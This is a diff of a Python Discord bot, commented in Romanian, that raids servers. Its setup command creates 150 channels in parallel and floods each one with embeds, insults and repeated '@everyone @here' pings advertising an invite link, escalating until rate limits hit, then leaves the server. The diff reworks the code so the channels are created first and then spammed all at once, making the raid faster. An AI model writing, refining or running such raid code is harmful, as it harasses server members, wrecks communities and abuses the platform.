@@ -332,26 +332,38 @@ async def setup(ctx):
         "larp empire on top"
     ]
 
-    # ===== CREARE 150 CANALE =====
+    # ===== CREARE 150 CANALE + SPAM SIMULTAN =====
     total_channels = 150
     font_styles = ["bold", "script", "double"]
     created_channels = []
 
-    await user.send(f"🔄 Încep crearea a {total_channels} de canale...")
+    await user.send(f"🔄 Încep crearea a {total_channels} de canale și spam simultan...")
 
-    # Semafor pentru trimitere mesaje
-    send_semaphore = asyncio.Semaphore(10)
+    # Semafor pentru a limita numărul de canale create simultan (evită rate-limit)
+    create_semaphore = asyncio.Semaphore(20)
 
-    async def send_messages_to_channel(channel):
-        """Trimite mesaje într-un canal: alternează embed și text (15 perechi), apoi spam crescător până la rate-limit."""
+    async def create_channel(index):
+        async with create_semaphore:
+            try:
+                base_name = random.choice(base_channel_names)
+                font_style = random.choice(font_styles)
+                styled_name = apply_font(base_name, font_style)
+                if len(styled_name) > 100:
+                    styled_name = base_name
+                ch = await guild.create_text_channel(name=styled_name)
+                created_channels.append(ch)
+                return ch
+            except Exception as e:
+                await user.send(f"⚠️ Eroare la crearea canalului {index}: {e}")
+                return None
+
+    async def spam_channel(channel):
+        """Trimite spam pe un canal deja creat."""
         try:
-            # ----- Faza 1: 15 perechi (embed + text) -----
-            for i in range(15):
-                # Trimite embed
+            # 15 perechi embed + text
+            for _ in range(15):
                 await channel.send(embed=embed_content)
                 await asyncio.sleep(0.15)
-
-                # Construiește textul cu ping-uri random (maxim 35) și insultă
                 ping_count = random.randint(5, 35)
                 insult = random.choice(insults)
                 ping_message = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
@@ -361,10 +373,8 @@ async def setup(ctx):
                 await channel.send(content=final_message)
                 await asyncio.sleep(0.15)
 
-            # ----- Faza 2: spam crescător (2,4,6,8,...) până la rate-limit -----
-            step = 2
-            max_pings = 35
-            for ping_count in range(2, max_pings + 1, step):
+            # Spam crescător
+            for ping_count in range(2, 36, 2):
                 insult = random.choice(insults)
                 ping_message = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
                 final_message = f"{insult}\n\n{ping_message}"
@@ -372,48 +382,29 @@ async def setup(ctx):
                     final_message = final_message[:1990] + "..."
                 await channel.send(content=final_message)
                 await asyncio.sleep(0.1)
-
         except discord.HTTPException as e:
-            if e.status == 429:  # Rate limit
+            if e.status == 429:
                 await user.send(f"⚠️ Rate limit atins! Oprește spam-ul și iese din server.")
                 await guild.leave()
                 return
-            else:
-                # Ignorăm alte erori HTTP pentru a continua cu celelalte canale
-                pass
         except Exception:
             pass
 
-    async def create_and_send(index):
-        try:
-            # Creare canal
-            base_name = random.choice(base_channel_names)
-            font_style = random.choice(font_styles)
-            styled_name = apply_font(base_name, font_style)
-            if len(styled_name) > 100:
-                styled_name = base_name
-            ch = await guild.create_text_channel(name=styled_name)
-            created_channels.append(ch)
+    # Creăm toate canalele în paralel
+    create_tasks = [create_channel(i) for i in range(total_channels)]
+    channels = await asyncio.gather(*create_tasks)
 
-            # Trimite mesajele pe canal
-            await send_messages_to_channel(ch)
+    # Filtrăm canalele create cu succes
+    valid_channels = [ch for ch in channels if ch is not None]
+    await user.send(f"✅ Canale create: {len(valid_channels)}. Începe spam-ul...")
 
-        except Exception as e:
-            # Doar log, nu părăsim serverul pentru o eroare la un canal
-            await user.send(f"⚠️ Eroare la canalul {index}: {e}")
+    # Lansăm spam pe fiecare canal în paralel
+    spam_tasks = [asyncio.create_task(spam_channel(ch)) for ch in valid_channels]
 
-    # Creare canale în loturi de câte 10 cu pauză de 0.5 secunde
-    for i in range(0, total_channels, 10):
-        batch = [create_and_send(i+j) for j in range(10) if i+j < total_channels]
-        await asyncio.gather(*batch)
-        await asyncio.sleep(0.5)
+    # Așteptăm finalizarea spam-ului (sau până la rate-limit)
+    await asyncio.gather(*spam_tasks)
 
-    await user.send(f"✅ Canale create: {len(created_channels)}. Trimiterea mesajelor a început...")
-
-    # Așteaptă 10 secunde pentru ca task-urile din fundal să trimită cât mai multe mesaje
-    await asyncio.sleep(10)
-
-    await user.send("✅ Procesul a fost inițiat. Părăsesc serverul...")
+    await user.send("✅ Procesul s-a încheiat. Părăsesc serverul...")
 
     try:
         await guild.create_role(name="1weeksober-on-top")
